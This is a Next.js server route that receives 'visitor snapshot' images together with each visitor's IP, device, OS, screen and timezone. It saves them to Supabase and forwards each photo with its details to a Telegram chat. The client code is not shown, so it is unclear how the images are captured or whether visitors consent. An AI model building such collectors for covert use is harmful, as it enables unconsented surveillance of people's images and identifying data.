import { createClient } from "@supabase/supabase-js";
import { NextResponse } from "next/server";

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL ?? "";
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY ?? "";
const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN ?? "";
const telegramChatId = process.env.TELEGRAM_CHAT_ID ?? "";

// Use a service role for server-side operations
const supabase = createClient(supabaseUrl, supabaseServiceKey);

export async function POST(request: Request) {
  try {
    const { image, sessionId, device, os, screenResolution, timezone } =
      await request.json();

    if (!image) {
      return NextResponse.json({ error: "No image provided" }, { status: 400 });
    }

    // IP address olish (Vercel va boshqa platformalar uchun)
    const ip =
      request.headers.get("x-real-ip") ||
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      request.headers.get("cf-connecting-ip") || // Cloudflare
      "Unknown";

    // Convert base64 to buffer
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const imageBuffer = Buffer.from(base64Data, "base64");

    // Generate filename
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, "0");
    const day = String(now.getDate()).padStart(2, "0");
    const timestamp = Date.now();
    const randomId = Math.random().toString(36).slice(2, 8);
    const filePath = `${year}/${month}/${day}/visitor_${timestamp}_${randomId}.jpg`;

    // Upload to Supabase Storage
    const { error: uploadError } = await supabase.storage
      .from("visitor-snapshots")
      .upload(filePath, imageBuffer, {
        contentType: "image/jpeg",
        cacheControl: "3600",
      });

    if (uploadError) {
      console.error("Upload error:", uploadError);
      return NextResponse.json({ error: "Upload failed" }, { status: 500 });
    }

    // Send to Telegram first to get message_id
    const telegramMessageId = await sendToTelegram(imageBuffer, {
      sessionId,
      device,
      os,
      screenResolution,
      timezone,
      createdAt: now.toISOString(),
      ip,
    });

    // Save to database with telegram_message_id
    const { error: dbError } = await supabase.from("visitor_snapshots").insert({
      session_id: sessionId || null,
      image_path: filePath,
      device,
      os,
      ip_address: ip,
      screen_resolution: screenResolution,
      timezone,
      telegram_message_id: telegramMessageId,
    });

    if (dbError) {
      console.error("Database error:", dbError);
    }

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Snapshot error:", error);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 },
    );
  }
}

// Session ID dan qisqa hash yaratish
function getSessionHash(sessionId: string): string {
  return sessionId.slice(0, 8).toUpperCase();
}

async function sendToTelegram(
  imageBuffer: Buffer,
  info: {
    sessionId?: string | null;
    device: string;
    os: string;
    screenResolution: string;
    timezone: string;
    createdAt: string;
    ip: string;
  },
): Promise<number | null> {
  const sessionTag = info.sessionId
    ? `🏷 <code>${getSessionHash(info.sessionId)}</code>`
    : "🏷 <i>Yangi tashrif</i>";

  const caption = `📸 <b>Tashrif</b>

${sessionTag} • 🌐 ${info.ip}
📱 ${info.device} • ${info.os}
📐 ${info.screenResolution} • 🕐 ${info.timezone}
⏰ ${new Date(info.createdAt).toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent" })}`;

  // Buffer to Uint8Array (Blob compatible)
  const uint8Array = new Uint8Array(imageBuffer);

  const formData = new FormData();
  formData.append("chat_id", telegramChatId);
  formData.append(
    "photo",
    new Blob([uint8Array], { type: "image/jpeg" }),
    "visitor.jpg",
  );
  formData.append("caption", caption);
  formData.append("parse_mode", "HTML");

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`,
      {
        method: "POST",
        body: formData,
      },
    );
    const data = await response.json();
    return data.result?.message_id || null;
  } catch (error) {
    console.error("Telegram error:", error);
    return null;
  }
}
